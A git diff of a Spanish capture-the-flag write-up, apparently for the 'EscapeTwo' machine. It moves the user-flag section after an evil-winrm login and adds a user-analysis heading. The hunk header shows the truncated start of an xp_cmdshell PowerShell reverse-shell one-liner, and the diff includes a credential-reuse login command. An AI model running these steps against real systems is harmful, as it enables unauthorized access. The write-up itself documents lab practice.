@@ -179,10 +179,6 @@ EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TC
 
 [![SHELL](/assets/img/posts/escapeTwo/shell_sa.png)](/assets/img/posts/escapeTwo/shell_sa.png)
 
-## User Flag
-
-[![Flag](/assets/img/posts/escapeTwo/user_flag.png)](/assets/img/posts/escapeTwo/user_flag.png)
-
 ## Explorando el sistema.
 
 Una vez que tenemos acceso a la shell, podemos explorar el sistema y ver si conseguimos alguna información.
@@ -211,6 +207,13 @@ Parece ser que el usuario "ryan" tiene la misma contraseña que el servicio "sql
 ```bash
 evil-winrm -i 10.10.11.51 -u ryan -p 'la_contraseña_encontrada'
 ```
+
+## User Flag
+
+[![Flag](/assets/img/posts/escapeTwo/user_flag.png)](/assets/img/posts/escapeTwo/user_flag.png)
+
+## Análisis del usuario 
+
 [![WINRM](/assets/img/posts/escapeTwo/ryan_permisos.png)](/assets/img/posts/escapeTwo/ryan_permisos.png)
 
 Ryan es miembro del grupo "Management Department" y tiene acceso al "Certificate Service DCOM Access". Una vía de ataque podría ser a través de los certificados.
